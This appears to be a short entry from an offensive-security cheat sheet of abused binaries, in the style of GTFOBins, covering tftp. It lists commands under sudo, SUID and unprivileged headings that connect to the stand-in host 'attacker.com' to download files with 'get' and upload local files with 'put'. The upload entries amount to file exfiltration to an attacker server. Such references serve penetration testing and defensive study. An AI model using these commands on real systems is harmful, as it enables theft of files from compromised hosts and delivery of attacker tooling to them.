tftp
====

Download
--------

[Sudo]
    tftp attacker.com
get /path/to/input-file

[SUID]
    tftp attacker.com
get /path/to/input-file

[Unprivileged]
    tftp attacker.com
get /path/to/input-file

Upload
------

[Sudo]
    tftp attacker.com
put /path/to/input-file

[SUID]
    tftp attacker.com
put /path/to/input-file

[Unprivileged]
    tftp attacker.com
put /path/to/input-file
